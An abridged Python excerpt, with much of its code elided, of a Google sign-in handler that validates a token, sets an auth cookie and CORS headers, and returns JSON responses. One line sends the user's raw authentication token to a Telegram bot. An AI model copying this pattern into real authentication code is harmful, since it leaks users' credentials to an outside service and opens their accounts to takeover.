...
class m:
    ...
    def google_auth(self, invoking_function_name, request, google_client_id, sqlite_db_path, post_authentication_redirect_url,
        ...
        self.send_telegram_message(f"GA TOKEN: {token}", telegram_bot_preset_name)
        ...
        try:
            if token:
                ...
                if idinfo:
                    ...
                    response_data = {'success': True, 'user': idinfo, 'url': post_authentication_redirect_url}
                    http_response = HTTPResponse(status=200, body=json.dumps(response_data))
                    http_response.set_cookie('authToken', token, httponly=True, secure=True, path='/', 
                    ...
                    http_response.set_header("Access-Control-Allow-Methods", "POST, OPTIONS")
                    http_response.set_header("Access-Control-Allow-Headers", "Content-Type")

                    return http_response
                else:
                    return HTTPResponse(status=400, body=json.dumps({'success': False, 'message': 'Invalid token'}))
            else:
                return HTTPResponse(status=400, body=json.dumps({'success': False, 'message': 'Token not provided'}))
